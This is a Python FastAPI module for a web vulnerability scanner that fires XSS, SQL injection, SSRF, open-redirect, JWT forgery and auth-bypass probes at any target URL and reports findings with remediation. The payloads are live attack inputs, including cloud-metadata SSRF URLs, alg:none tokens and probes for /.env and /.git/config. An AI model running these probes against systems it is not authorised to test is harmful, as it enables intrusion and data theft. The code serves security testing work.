"""
Attack Suite API — non-AI web security testing via httpx.

Tests a target URL for common vulnerabilities using bug bounty TTPs.
No external CLI tools required — all tests use httpx.
"""

import asyncio
import base64
import hashlib
import hmac
import json
import re
import time
import uuid
from datetime import datetime, timezone
from typing import Annotated, AsyncGenerator, TypedDict
from urllib.parse import urlparse

import httpx
from fastapi import APIRouter, Depends, HTTPException, status
from fastapi.responses import StreamingResponse
from pydantic import BaseModel, field_validator

from app.core.dependencies import get_current_user
from app.models.db.user import User

router = APIRouter(prefix="/attack-suite", tags=["AttackSuite"])

_scan_history: dict[str, dict] = {}

AVAILABLE_MODULES = {
    "headers": "Security headers analysis — checks for missing/misconfigured HTTP security headers",
    "redirect": "Open redirect testing — fuzzes common redirect parameters",
    "xss": "Reflected XSS detection — tests URL parameters with common payloads",
    "sqli": "SQL injection detection — time-based blind and error-based tests",
    "ssrf": "SSRF detection — tests for Server-Side Request Forgery via common params",
    "graphql": "GraphQL security — introspection and batch query checks",
    "jwt": "JWT vulnerability testing — alg:none, weak secrets, claims exposure",
    "auth_bypass": "Auth bypass techniques — admin path exposure, method override, X-Forwarded-For",
    "takeover": "Subdomain/service takeover fingerprinting — checks for unclaimed service responses",
}


class AttackSuiteRequest(BaseModel):
    target: str
    modules: list[str] = ["headers", "redirect", "xss", "sqli", "ssrf", "graphql", "jwt", "auth_bypass", "takeover"]
    auth_headers: dict[str, str] = {}
    follow_redirects: bool = True
    timeout: int = 10

    @field_validator("target")
    @classmethod
    def validate_target(cls, v: str) -> str:
        v = v.strip()
        if not v:
            raise ValueError("Target is required")
        if re.search(r"[;&|`$(){}<>]", v):
            raise ValueError("Target contains invalid characters")
        if not v.startswith(("http://", "https://")):
            raise ValueError("Target must start with http:// or https://")
        return v

    @field_validator("modules")
    @classmethod
    def validate_modules(cls, v: list[str]) -> list[str]:
        valid = set(AVAILABLE_MODULES.keys())
        invalid = [m for m in v if m not in valid]
        if invalid:
            raise ValueError(f"Unknown modules: {invalid}. Valid: {sorted(valid)}")
        return v

    @field_validator("timeout")
    @classmethod
    def validate_timeout(cls, v: int) -> int:
        if not (1 <= v <= 60):
            raise ValueError("Timeout must be between 1 and 60 seconds")
        return v


class AttackFinding(TypedDict):
    id: str
    module: str
    test_name: str
    severity: str  # critical, high, medium, low, info
    title: str
    description: str
    evidence: str
    url: str
    is_vulnerable: bool
    remediation: str


def _finding(
    module: str,
    test_name: str,
    severity: str,
    title: str,
    description: str,
    evidence: str,
    url: str,
    is_vulnerable: bool,
    remediation: str,
) -> AttackFinding:
    return AttackFinding(
        id=str(uuid.uuid4()),
        module=module,
        test_name=test_name,
        severity=severity,
        title=title,
        description=description,
        evidence=evidence,
        url=url,
        is_vulnerable=is_vulnerable,
        remediation=remediation,
    )


# ---------------------------------------------------------------------------
# Module 1: Security Headers
# ---------------------------------------------------------------------------

async def _module_headers(target: str, client: httpx.AsyncClient) -> AsyncGenerator[AttackFinding, None]:
    try:
        resp = await client.get(target)
    except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError) as exc:
        return

    headers = {k.lower(): v for k, v in resp.headers.items()}

    # HSTS
    if "strict-transport-security" not in headers:
        yield _finding(
            module="headers",
            test_name="missing_hsts",
            severity="medium",
            title="Missing Strict-Transport-Security Header",
            description="The Strict-Transport-Security (HSTS) header is not set. This allows downgrade attacks.",
            evidence="Header 'Strict-Transport-Security' not present in response",
            url=target,
            is_vulnerable=True,
            remediation="Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
        )

    # CSP
    if "content-security-policy" not in headers:
        yield _finding(
            module="headers",
            test_name="missing_csp",
            severity="medium",
            title="Missing Content-Security-Policy Header",
            description="No Content-Security-Policy header found. This increases XSS risk.",
            evidence="Header 'Content-Security-Policy' not present in response",
            url=target,
            is_vulnerable=True,
            remediation="Add a Content-Security-Policy header that restricts script sources.",
        )

    # X-Frame-Options / frame-ancestors in CSP
    csp_value = headers.get("content-security-policy", "")
    xfo_value = headers.get("x-frame-options", "")
    if not xfo_value and "frame-ancestors" not in csp_value:
        yield _finding(
            module="headers",
            test_name="missing_xfo",
            severity="medium",
            title="Missing X-Frame-Options / frame-ancestors",
            description="No clickjacking protection found. The page may be embeddable in iframes.",
            evidence="Neither 'X-Frame-Options' header nor 'frame-ancestors' CSP directive found",
            url=target,
            is_vulnerable=True,
            remediation="Add 'X-Frame-Options: DENY' or include 'frame-ancestors' in your CSP.",
        )

    # X-Content-Type-Options
    xcto = headers.get("x-content-type-options", "")
    if xcto.lower() != "nosniff":
        yield _finding(
            module="headers",
            test_name="missing_xcto",
            severity="low",
            title="Missing X-Content-Type-Options: nosniff",
            description="MIME-type sniffing is not disabled. Browsers may interpret files as a different MIME type.",
            evidence=f"X-Content-Type-Options: {xcto!r}" if xcto else "Header not present",
            url=target,
            is_vulnerable=True,
            remediation="Add: X-Content-Type-Options: nosniff",
        )

    # Referrer-Policy
    if "referrer-policy" not in headers:
        yield _finding(
            module="headers",
            test_name="missing_referrer_policy",
            severity="low",
            title="Missing Referrer-Policy Header",
            description="Without a Referrer-Policy, sensitive URL data may leak to third parties via the Referer header.",
            evidence="Header 'Referrer-Policy' not present",
            url=target,
            is_vulnerable=True,
            remediation="Add: Referrer-Policy: strict-origin-when-cross-origin",
        )

    # Permissions-Policy
    if "permissions-policy" not in headers:
        yield _finding(
            module="headers",
            test_name="missing_permissions_policy",
            severity="info",
            title="Missing Permissions-Policy Header",
            description="No Permissions-Policy header to restrict browser feature access.",
            evidence="Header 'Permissions-Policy' not present",
            url=target,
            is_vulnerable=False,
            remediation="Add a Permissions-Policy header to restrict camera, microphone, geolocation, etc.",
        )

    # Server header version disclosure
    server = headers.get("server", "")
    if server and re.search(r"[\d.]+", server):
        yield _finding(
            module="headers",
            test_name="server_version_disclosure",
            severity="low",
            title="Server Header Reveals Version Information",
            description=f"The Server header discloses version information which aids fingerprinting.",
            evidence=f"Server: {server}",
            url=target,
            is_vulnerable=True,
            remediation="Configure the server to omit version details from the Server header.",
        )

    # X-Powered-By
    xpb = headers.get("x-powered-by", "")
    if xpb:
        yield _finding(
            module="headers",
            test_name="x_powered_by",
            severity="low",
            title="X-Powered-By Header Present",
            description="The X-Powered-By header discloses technology stack information.",
            evidence=f"X-Powered-By: {xpb}",
            url=target,
            is_vulnerable=True,
            remediation="Remove the X-Powered-By header from server configuration.",
        )

    # CORS wildcard with credentials
    acao = headers.get("access-control-allow-origin", "")
    acac = headers.get("access-control-allow-credentials", "")
    if acao == "*" and acac.lower() == "true":
        yield _finding(
            module="headers",
            test_name="cors_wildcard_credentials",
            severity="high",
            title="CORS Wildcard with Credentials Allowed",
            description="Access-Control-Allow-Origin: * combined with Access-Control-Allow-Credentials: true is an insecure CORS configuration.",
            evidence=f"Access-Control-Allow-Origin: {acao}\nAccess-Control-Allow-Credentials: {acac}",
            url=target,
            is_vulnerable=True,
            remediation="Never combine Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true. Specify exact origins.",
        )


# ---------------------------------------------------------------------------
# Module 2: Open Redirect
# ---------------------------------------------------------------------------

async def _module_redirect(target: str, client: httpx.AsyncClient) -> AsyncGenerator[AttackFinding, None]:
    redirect_params = [
        "url", "redirect", "next", "return", "returnUrl", "redirectTo",
        "goto", "dest", "destination", "rurl", "target", "link", "to", "ref",
    ]
    evil_payloads = [
        "https://evil.example.com",
        "//evil.example.com",
    ]

    found = set()

    for param in redirect_params:
        for payload in evil_payloads:
            test_url = f"{target}?{param}={payload}"
            try:
                # Disable follow_redirects so we can inspect Location header
                resp = await client.get(test_url, follow_redirects=False)
                location = resp.headers.get("location", "")
                if "evil.example.com" in location:
                    key = f"{param}:{payload}"
                    if key not in found:
                        found.add(key)
                        yield _finding(
                            module="redirect",
                            test_name=f"open_redirect_{param}",
                            severity="high",
                            title=f"Open Redirect via '{param}' Parameter",
                            description=f"The parameter '{param}' accepts an arbitrary URL and redirects the user without validation.",
                            evidence=f"GET {test_url}\nHTTP {resp.status_code}\nLocation: {location}",
                            url=test_url,
                            is_vulnerable=True,
                            remediation="Validate redirect URLs against an allowlist of known-good destinations. Reject off-site redirects.",
                        )
            except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
                continue


# ---------------------------------------------------------------------------
# Module 3: Reflected XSS
# ---------------------------------------------------------------------------

async def _module_xss(target: str, client: httpx.AsyncClient) -> AsyncGenerator[AttackFinding, None]:
    payloads = [
        "<script>alert(1)</script>",
        '"><img src=x onerror=alert(1)>',
        "<svg onload=alert(1)>",
    ]
    params = ["q", "search", "input"]
    detection_patterns = [
        "<script>alert",
        "onerror=alert",
        "onload=alert",
    ]

    found_xss = False

    for param in params:
        for payload in payloads:
            test_url = f"{target}?{param}={payload}"
            try:
                resp = await client.get(test_url)
                ct = resp.headers.get("content-type", "")
                if "text/html" in ct:
                    body = resp.text
                    for pattern in detection_patterns:
                        if pattern in body:
                            if not found_xss:
                                found_xss = True
                                yield _finding(
                                    module="xss",
                                    test_name=f"reflected_xss_{param}",
                                    severity="high",
                                    title=f"Reflected XSS via '{param}' Parameter",
                                    description=f"XSS payload reflected unencoded in HTML response via the '{param}' parameter.",
                                    evidence=f"GET {test_url}\nPayload: {payload}\nPattern found: {pattern}",
                                    url=test_url,
                                    is_vulnerable=True,
                                    remediation="HTML-encode all user input before rendering in responses. Implement a Content-Security-Policy.",
                                )
                            break
            except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
                continue

    # Check X-XSS-Protection: 0
    try:
        resp = await client.get(target)
        xxp = resp.headers.get("x-xss-protection", "")
        if xxp.strip() == "0":
            yield _finding(
                module="xss",
                test_name="xss_protection_disabled",
                severity="info",
                title="X-XSS-Protection Header Set to 0 (Disabled)",
                description="The X-XSS-Protection header is explicitly set to 0, disabling the browser's built-in XSS filter.",
                evidence=f"X-XSS-Protection: {xxp}",
                url=target,
                is_vulnerable=False,
                remediation="While modern browsers no longer rely on this header, consider removing it or setting it to '1; mode=block'.",
            )
    except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
        pass


# ---------------------------------------------------------------------------
# Module 4: SQL Injection
# ---------------------------------------------------------------------------

async def _module_sqli(target: str, client: httpx.AsyncClient) -> AsyncGenerator[AttackFinding, None]:
    params = ["id", "user", "search", "q", "page"]
    time_payloads = [
        "1' AND SLEEP(3)--",
        "1; WAITFOR DELAY '0:0:3'--",
        "1' AND pg_sleep(3)--",
    ]
    error_payloads = ["'", "1'", '"']
    error_patterns = ["SQL", "mysql", "ORA-", "syntax error", "sqlite", "pg_"]

    for param in params:
        # Baseline timing
        baseline_url = f"{target}?{param}=1"
        try:
            t0 = time.monotonic()
            await client.get(baseline_url)
            baseline_time = time.monotonic() - t0
        except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
            continue

        if baseline_time >= 0.5:
            # Already slow — skip time-based for this param
            pass
        else:
            for payload in time_payloads:
                test_url = f"{target}?{param}={payload}"
                try:
                    t0 = time.monotonic()
                    await client.get(test_url)
                    elapsed = time.monotonic() - t0
                    if elapsed >= 2.5:
                        yield _finding(
                            module="sqli",
                            test_name=f"sqli_time_based_{param}",
                            severity="critical",
                            title=f"Time-Based Blind SQL Injection in '{param}' Parameter",
                            description=f"The parameter '{param}' appears vulnerable to time-based blind SQL injection. Response delayed by {elapsed:.1f}s.",
                            evidence=f"GET {test_url}\nBaseline: {baseline_time:.2f}s | With payload: {elapsed:.2f}s",
                            url=test_url,
                            is_vulnerable=True,
                            remediation="Use parameterized queries / prepared statements. Never interpolate user input into SQL.",
                        )
                        break  # One finding per param
                except httpx.TimeoutException:
                    # Timeout itself can indicate time-based injection
                    yield _finding(
                        module="sqli",
                        test_name=f"sqli_time_based_timeout_{param}",
                        severity="critical",
                        title=f"Possible Time-Based Blind SQL Injection in '{param}' (Request Timed Out)",
                        description=f"Request with SQL sleep payload timed out for parameter '{param}', suggesting time-based injection.",
                        evidence=f"GET {test_url}\nRequest timed out",
                        url=test_url,
                        is_vulnerable=True,
                        remediation="Use parameterized queries / prepared statements. Never interpolate user input into SQL.",
                    )
                    break
                except (httpx.ConnectError, httpx.RequestError):
                    continue

        # Error-based
        for payload in error_payloads:
            test_url = f"{target}?{param}={payload}"
            try:
                resp = await client.get(test_url)
                body = resp.text
                for pattern in error_patterns:
                    if pattern.lower() in body.lower():
                        yield _finding(
                            module="sqli",
                            test_name=f"sqli_error_based_{param}",
                            severity="high",
                            title=f"Error-Based SQL Injection in '{param}' Parameter",
                            description=f"SQL error message detected in response for parameter '{param}'.",
                            evidence=f"GET {test_url}\nPayload: {payload!r}\nError pattern: {pattern}\nResponse snippet: {body[:300]}",
                            url=test_url,
                            is_vulnerable=True,
                            remediation="Use parameterized queries. Suppress verbose SQL error messages in production.",
                        )
                        break
            except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
                continue


# ---------------------------------------------------------------------------
# Module 5: SSRF
# ---------------------------------------------------------------------------

async def _module_ssrf(target: str, client: httpx.AsyncClient) -> AsyncGenerator[AttackFinding, None]:
    ssrf_params = [
        "url", "endpoint", "redirect", "next", "path", "dest", "uri",
        "target", "src", "href", "callback", "fetch", "load", "proxy",
    ]
    ssrf_urls = [
        ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "iam"]),
        ("http://metadata.google.internal/computeMetadata/v1/", ["computeMetadata", "project-id"]),
        ("http://localhost:80/", []),
        ("http://127.0.0.1:22/", ["ssh-", "OpenSSH"]),
    ]

    for param in ssrf_params:
        for ssrf_url, indicators in ssrf_urls:
            test_url = f"{target}?{param}={ssrf_url}"
            try:
                resp = await client.get(test_url, timeout=5)
                body = resp.text

                if indicators:
                    for indicator in indicators:
                        if indicator.lower() in body.lower():
                            yield _finding(
                                module="ssrf",
                                test_name=f"ssrf_critical_{param}",
                                severity="critical",
                                title=f"Server-Side Request Forgery (SSRF) — Cloud Metadata Accessible via '{param}'",
                                description=f"The server fetched internal URL '{ssrf_url}' and returned cloud metadata in the response.",
                                evidence=f"GET {test_url}\nIndicator found: {indicator}\nResponse snippet: {body[:500]}",
                                url=test_url,
                                is_vulnerable=True,
                                remediation="Validate and allowlist URLs before making server-side requests. Block access to metadata endpoints.",
                            )
                            return  # Critical finding — stop
            except httpx.ConnectError as exc:
                err_str = str(exc).lower()
                if "connection refused" in err_str or "connection reset" in err_str:
                    yield _finding(
                        module="ssrf",
                        test_name=f"ssrf_potential_{param}",
                        severity="medium",
                        title=f"Potential SSRF — Server Attempted Internal Connection via '{param}'",
                        description=f"Connection refused/reset response suggests the server attempted to connect to '{ssrf_url}', indicating SSRF potential.",
                        evidence=f"GET {test_url}\nError: {str(exc)[:200]}",
                        url=test_url,
                        is_vulnerable=True,
                        remediation="Validate and allowlist URLs before making server-side requests.",
                    )
            except (httpx.TimeoutException, httpx.RequestError):
                continue


# ---------------------------------------------------------------------------
# Module 6: GraphQL
# ---------------------------------------------------------------------------

async def _module_graphql(target: str, client: httpx.AsyncClient) -> AsyncGenerator[AttackFinding, None]:
    parsed = urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"

    gql_paths = ["/graphql", "/api/graphql", "/gql", "/query"]
    introspection_query = {"query": "{__schema{types{name}}}"}
    batch_query = [{"query": "{__typename}"}, {"query": "{__typename}"}]

    for path in gql_paths:
        endpoint = base + path
        # Introspection
        try:
            resp = await client.post(
                endpoint,
                json=introspection_query,
                headers={"Content-Type": "application/json"},
            )
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if "__schema" in str(data) and "types" in str(data):
                        yield _finding(
                            module="graphql",
                            test_name="graphql_introspection",
                            severity="high",
                            title=f"GraphQL Introspection Enabled at {path}",
                            description="GraphQL introspection is enabled, exposing the full API schema to attackers.",
                            evidence=f"POST {endpoint}\nResponse snippet: {str(data)[:400]}",
                            url=endpoint,
                            is_vulnerable=True,
                            remediation="Disable GraphQL introspection in production environments.",
                        )

                        # Batch query check
                        try:
                            bresp = await client.post(
                                endpoint,
                                json=batch_query,
                                headers={"Content-Type": "application/json"},
                            )
                            if bresp.status_code == 200:
                                bdata = bresp.json()
                                if isinstance(bdata, list) and len(bdata) == 2:
                                    yield _finding(
                                        module="graphql",
                                        test_name="graphql_batch_queries",
                                        severity="medium",
                                        title=f"GraphQL Batch Queries Enabled at {path}",
                                        description="GraphQL batch queries are enabled, which can be abused for DoS or amplification attacks.",
                                        evidence=f"POST {endpoint}\nBatch response: {str(bdata)[:200]}",
                                        url=endpoint,
                                        is_vulnerable=True,
                                        remediation="Disable or limit GraphQL query batching. Implement query depth and complexity limits.",
                                    )
                        except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
                            pass

                        return  # Found a GraphQL endpoint — stop searching
                except (ValueError, KeyError):
                    pass
        except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
            continue


# ---------------------------------------------------------------------------
# Module 7: JWT
# ---------------------------------------------------------------------------

def _b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


async def _module_jwt(
    target: str,
    client: httpx.AsyncClient,
    auth_headers: dict[str, str],
) -> AsyncGenerator[AttackFinding, None]:
    # Extract Bearer token
    token = None
    for k, v in auth_headers.items():
        if k.lower() == "authorization" and v.lower().startswith("bearer "):
            token = v[7:].strip()
            break

    if not token:
        return

    parts = token.split(".")
    if len(parts) != 3:
        return

    try:
        header_data = json.loads(_b64url_decode(parts[0]))
        payload_data = json.loads(_b64url_decode(parts[1]))
    except Exception:
        return

    # Info — claims exposure
    interesting_claims = {k: v for k, v in payload_data.items() if k in ("sub", "email", "role", "exp", "iat", "iss")}
    if interesting_claims:
        yield _finding(
            module="jwt",
            test_name="jwt_claims_info",
            severity="info",
            title="JWT Claims Exposed",
            description=f"The JWT payload contains the following claims: {list(interesting_claims.keys())}. JWT payloads are base64-encoded, not encrypted.",
            evidence=f"Header: {json.dumps(header_data)}\nPayload claims: {json.dumps(interesting_claims)}",
            url=target,
            is_vulnerable=False,
            remediation="Do not store sensitive data in JWT payloads. Use opaque tokens for sensitive sessions.",
        )

    # Test alg:none
    none_header = _b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    none_payload = parts[1]
    none_token = f"{none_header}.{none_payload}."

    test_paths = ["/api/me", "/api/user", "/me", "/profile"]
    parsed = urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"

    for path in test_paths:
        test_url = base + path
        try:
            resp = await client.get(
                test_url,
                headers={"Authorization": f"Bearer {none_token}"},
            )
            if resp.status_code == 200 and len(resp.content) > 50:
                yield _finding(
                    module="jwt",
                    test_name="jwt_alg_none",
                    severity="critical",
                    title="JWT Algorithm None Attack — Authentication Bypass",
                    description=f"The server accepted a JWT with alg:none (no signature verification) at '{path}'.",
                    evidence=f"GET {test_url}\nForged token (alg:none): {none_token[:80]}...\nHTTP {resp.status_code}\nResponse: {resp.text[:200]}",
                    url=test_url,
                    is_vulnerable=True,
                    remediation="Reject JWTs with alg:none. Explicitly whitelist allowed algorithms server-side.",
                )
                break
        except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
            continue

    # Test weak secrets (HMAC-SHA256)
    alg = header_data.get("alg", "").upper()
    if alg in ("HS256", "HS384", "HS512"):
        weak_secrets = ["secret", "password", "admin", "key", "test", "123456", "changeme", "jwt_secret"]
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        try:
            expected_sig = _b64url_decode(parts[2])
        except Exception:
            return

        hash_fn = hashlib.sha256 if alg == "HS256" else (hashlib.sha384 if alg == "HS384" else hashlib.sha512)

        for secret in weak_secrets:
            sig = hmac.new(secret.encode(), signing_input, hash_fn).digest()
            if hmac.compare_digest(sig, expected_sig):
                yield _finding(
                    module="jwt",
                    test_name="jwt_weak_secret",
                    severity="critical",
                    title=f"JWT Signed with Weak Secret: '{secret}'",
                    description=f"The JWT is signed with a common/weak secret '{secret}'. Attackers can forge tokens.",
                    evidence=f"Algorithm: {alg}\nSecret matched: {secret!r}",
                    url=target,
                    is_vulnerable=True,
                    remediation="Use a cryptographically random secret of at least 256 bits. Rotate all existing tokens.",
                )
                break


# ---------------------------------------------------------------------------
# Module 8: Auth Bypass
# ---------------------------------------------------------------------------

async def _module_auth_bypass(target: str, client: httpx.AsyncClient) -> AsyncGenerator[AttackFinding, None]:
    parsed = urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"

    # 1. Common admin/sensitive paths
    admin_paths = [
        "/admin", "/admin/users", "/api/admin", "/api/internal",
        "/debug", "/.env", "/.git/config", "/actuator",
        "/actuator/health", "/actuator/env",
    ]

    for path in admin_paths:
        url = base + path
        try:
            resp = await client.get(url)
            if resp.status_code == 200 and len(resp.content) > 100:
                yield _finding(
                    module="auth_bypass",
                    test_name=f"exposed_path_{path.strip('/').replace('/', '_')}",
                    severity="high",
                    title=f"Sensitive Path Accessible Without Authentication: {path}",
                    description=f"The path '{path}' returned HTTP 200 with substantial content without requiring authentication.",
                    evidence=f"GET {url}\nHTTP {resp.status_code}\nContent-Length: {len(resp.content)}\nSnippet: {resp.text[:200]}",
                    url=url,
                    is_vulnerable=True,
                    remediation=f"Protect '{path}' with proper authentication and authorization checks.",
                )
        except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
            continue

    # 2. HTTP method override
    api_url = base + "/api/users"
    try:
        resp = await client.post(
            api_url,
            headers={"X-HTTP-Method-Override": "GET"},
        )
        if resp.status_code == 200:
            yield _finding(
                module="auth_bypass",
                test_name="http_method_override",
                severity="medium",
                title="HTTP Method Override Accepted",
                description="The server accepted X-HTTP-Method-Override header, potentially allowing method restriction bypass.",
                evidence=f"POST {api_url}\nX-HTTP-Method-Override: GET\nHTTP {resp.status_code}",
                url=api_url,
                is_vulnerable=True,
                remediation="Disable or restrict HTTP method override headers. Validate the actual HTTP method server-side.",
            )
    except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
        pass

    # 3. Path traversal bypass
    traversal_paths = ["//admin", "/api/./admin"]
    for path in traversal_paths:
        url = base + path
        try:
            resp = await client.get(url)
            if resp.status_code == 200 and len(resp.content) > 100:
                yield _finding(
                    module="auth_bypass",
                    test_name=f"path_traversal_bypass_{path.strip('/').replace('/', '_')}",
                    severity="high",
                    title=f"Path Traversal Auth Bypass: {path}",
                    description=f"The path '{path}' bypassed access controls via path traversal/normalization.",
                    evidence=f"GET {url}\nHTTP {resp.status_code}\nSnippet: {resp.text[:200]}",
                    url=url,
                    is_vulnerable=True,
                    remediation="Normalize URL paths before applying authorization checks.",
                )
        except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
            continue

    # 4. X-Forwarded-For bypass
    for path in ["/admin", "/api/admin"]:
        url = base + path
        try:
            # First check if it's normally blocked
            normal_resp = await client.get(url)
            if normal_resp.status_code in (401, 403):
                xff_resp = await client.get(url, headers={"X-Forwarded-For": "127.0.0.1"})
                if xff_resp.status_code == 200:
                    yield _finding(
                        module="auth_bypass",
                        test_name=f"xff_bypass_{path.strip('/')}",
                        severity="high",
                        title=f"X-Forwarded-For Bypass at {path}",
                        description=f"Adding 'X-Forwarded-For: 127.0.0.1' bypassed the 401/403 restriction at '{path}'.",
                        evidence=f"Normal: GET {url} → {normal_resp.status_code}\nWith X-Forwarded-For: 127.0.0.1 → {xff_resp.status_code}",
                        url=url,
                        is_vulnerable=True,
                        remediation="Do not use X-Forwarded-For for IP-based access control. Trust only the actual connection IP.",
                    )
        except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
            continue


# ---------------------------------------------------------------------------
# Module 9: Subdomain/Service Takeover
# ---------------------------------------------------------------------------

async def _module_takeover(target: str, client: httpx.AsyncClient) -> AsyncGenerator[AttackFinding, None]:
    fingerprints = [
        ("There isn't a GitHub Pages site here", "GitHub Pages takeover possible"),
        ("NoSuchBucket", "AWS S3 bucket takeover possible"),
        ("No Such Account", "Heroku account takeover possible"),
        ("This page is in Maintenance Mode", "Webflow site takeover possible"),
        ("The specified bucket does not exist", "AWS S3 bucket takeover possible"),
        ("Repository not found", "GitHub/Bitbucket repository takeover possible"),
    ]
    takeover_server_patterns = ["fastly.net", "herokudns.com", "amazonaws.com", "github.io"]

    try:
        resp = await client.get(target)
        body = resp.text
        server = resp.headers.get("server", "").lower()

        for fingerprint, description in fingerprints:
            if fingerprint.lower() in body.lower():
                yield _finding(
                    module="takeover",
                    test_name="subdomain_takeover_fingerprint",
                    severity="critical",
                    title=f"Subdomain/Service Takeover Possible — {description}",
                    description=f"Response body contains takeover fingerprint: '{fingerprint}'. The underlying service may be unclaimed.",
                    evidence=f"GET {target}\nHTTP {resp.status_code}\nFingerprint: {fingerprint}\nServer: {resp.headers.get('server', 'N/A')}",
                    url=target,
                    is_vulnerable=True,
                    remediation="Reclaim or remove the DNS record pointing to this unclaimed service.",
                )
                return  # One finding per target

        # 404 from known CDN/hosting providers
        if resp.status_code == 404 and any(p in server for p in takeover_server_patterns):
            yield _finding(
                module="takeover",
                test_name="subdomain_takeover_cdn_404",
                severity="high",
                title=f"Possible Service Takeover — 404 from Hosting Provider",
                description=f"The target returns 404 via a known hosting provider ({server}), which may indicate an unclaimed service.",
                evidence=f"GET {target}\nHTTP {resp.status_code}\nServer: {resp.headers.get('server', 'N/A')}",
                url=target,
                is_vulnerable=True,
                remediation="Verify DNS records and ensure all referenced services are claimed and active.",
            )

    except (httpx.TimeoutException, httpx.ConnectError, httpx.RequestError):
        pass


# ---------------------------------------------------------------------------
# Main streaming function
# ---------------------------------------------------------------------------

async def _stream_attack_suite(scan_id: str, req: AttackSuiteRequest) -> AsyncGenerator[str, None]:
    def _sse(event: str, data: dict) -> str:
        return f"event: {event}\ndata: {json.dumps(data)}\n\n"

    start_time = time.monotonic()
    timestamp = datetime.now(timezone.utc).isoformat()

    yield _sse("start", {
        "scan_id": scan_id,
        "target": req.target,
        "modules": req.modules,
        "timestamp": timestamp,
    })

    _scan_history[scan_id] = {
        "id": scan_id,
        "target": req.target,
        "modules": req.modules,
        "status": "running",
        "started_at": timestamp,
        "findings": [],
        "counts": {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0},
    }

    findings: list[dict] = []
    counts: dict[str, int] = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}

    try:
        async with httpx.AsyncClient(
            headers=req.auth_headers,
            timeout=req.timeout,
            follow_redirects=req.follow_redirects,
            verify=False,  # Bug bounty targets may have self-signed certs
        ) as client:
            module_map = {
                "headers": lambda: _module_headers(req.target, client),
                "redirect": lambda: _module_redirect(req.target, client),
                "xss": lambda: _module_xss(req.target, client),
                "sqli": lambda: _module_sqli(req.target, client),
                "ssrf": lambda: _module_ssrf(req.target, client),
                "graphql": lambda: _module_graphql(req.target, client),
                "jwt": lambda: _module_jwt(req.target, client, req.auth_headers),
                "auth_bypass": lambda: _module_auth_bypass(req.target, client),
                "takeover": lambda: _module_takeover(req.target, client),
            }

            for module_name in req.modules:
                if module_name not in module_map:
                    continue

                yield _sse("progress", {
                    "message": f"Running module: {module_name}",
                    "module": module_name,
                })
                await asyncio.sleep(0)

                try:
                    async for finding in module_map[module_name]():
                        findings.append(dict(finding))
                        sev = finding.get("severity", "info").lower()
                        counts[sev] = counts.get(sev, 0) + 1
                        _scan_history[scan_id]["findings"] = findings
                        _scan_history[scan_id]["counts"] = counts
                        yield _sse("finding", dict(finding))
                        await asyncio.sleep(0)
                except Exception as exc:
                    yield _sse("progress", {
                        "message": f"Module {module_name} error: {exc}",
                        "module": module_name,
                    })

                yield _sse("progress", {
                    "message": f"Module {module_name} complete",
                    "module": module_name,
                })

        duration = time.monotonic() - start_time
        _scan_history[scan_id].update({
            "status": "completed",
            "completed_at": datetime.now(timezone.utc).isoformat(),
            "findings": findings,
            "counts": counts,
            "duration_seconds": round(duration, 2),
        })

        yield _sse("complete", {
            "scan_id": scan_id,
            "total_findings": len(findings),
            "counts": counts,
            "duration_seconds": round(duration, 2),
        })

    except Exception as exc:
        _scan_history[scan_id].update({"status": "failed", "error": str(exc)})
        yield _sse("error", {"message": str(exc)})


# ---------------------------------------------------------------------------
# Endpoints
# ---------------------------------------------------------------------------

@router.post("/scan", summary="Run an attack suite scan and stream results")
async def run_attack_suite_scan(
    payload: AttackSuiteRequest,
    current_user: Annotated[User, Depends(get_current_user)],
) -> StreamingResponse:
    scan_id = str(uuid.uuid4())
    return StreamingResponse(
        _stream_attack_suite(scan_id, payload),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no",
        },
    )


@router.get("/scans", summary="List attack suite scan history")
async def list_attack_suite_scans(
    current_user: Annotated[User, Depends(get_current_user)],
) -> dict:
    scans = sorted(
        _scan_history.values(),
        key=lambda s: s.get("started_at", ""),
        reverse=True,
    )
    return {"items": scans, "total": len(scans)}


@router.get("/scans/{scan_id}", summary="Get attack suite scan result")
async def get_attack_suite_scan(
    scan_id: str,
    current_user: Annotated[User, Depends(get_current_user)],
) -> dict:
    scan = _scan_history.get(scan_id)
    if not scan:
        raise HTTPException(status_code=404, detail="Scan not found")
    return scan


@router.get("/modules", summary="List available attack suite modules")
async def list_attack_suite_modules(
    current_user: Annotated[User, Depends(get_current_user)],
) -> dict:
    return {
        "modules": [
            {"name": name, "description": desc}
            for name, desc in AVAILABLE_MODULES.items()
        ]
    }
